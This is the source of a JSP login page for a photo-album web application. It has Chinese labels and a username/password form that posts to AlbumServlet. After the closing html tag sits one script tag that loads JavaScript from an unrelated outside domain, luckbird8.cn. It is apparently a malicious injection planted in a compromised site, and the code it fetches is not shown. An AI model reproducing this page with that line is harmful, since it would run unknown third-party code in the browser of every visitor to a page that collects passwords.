<%@ page
 contentType="text/html;charset=GBK"
 errorPage="error.jsp"
 %>
<html>
 	<head>
	<title></title>
	<style type="text/css">
 		.STYLE4 {
			font-size: 13px;
			font-family: "宋体";
			color: #244ac6;
			line-height: 16pt;
		}
	</style>
	<script language="JavaScript">
		function login() {
			var login=document.getElementById("login");
			login.style.display=(login.style.display=="none")? "block":"none";
			var log=document.getElementById("log");
			log.style.display=(log.style.display=="none")? "block":"none";
		}
	</script>
 	</head>
 	<body>
	<form action="AlbumServlet" method="post" name="myform" id="myform">
	<center><br><br><br><br>
	<table>
	<tr>
		<td>
		<div id="log" class="STYLE4" style="display:block">点击图片登陆您的相册.....
				<br></div>
		<img src="image/ge.jpg" onclick="JavaScript:login();"><br>
		<div id="login" class="STYLE4" style="display:none">
		<table>
		<tr>
			<td><font color="#30358D"><b>用户名:&nbsp;</td></b><td>
			<input type="text"  name="username" id="username" style="width:120">
					<br></font></td></tr>
		<tr>
			<td><font color="#30358D"><b>密&nbsp; 码:&nbsp;</td></b><td>
			<input type="password"  name="password" id="password" style="width:120">
			<br></font></td></tr>
		<tr height="10"><td></td></tr>
		<tr align="center">
			<td>
				<input type="submit" value="登陆">
				<input type="hidden" name="action" value="userLogin">
			</td>
			<td>
				<input type="reset" value="重置">
			</td></tr></table>
	</div></td></tr></table></center></form></body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>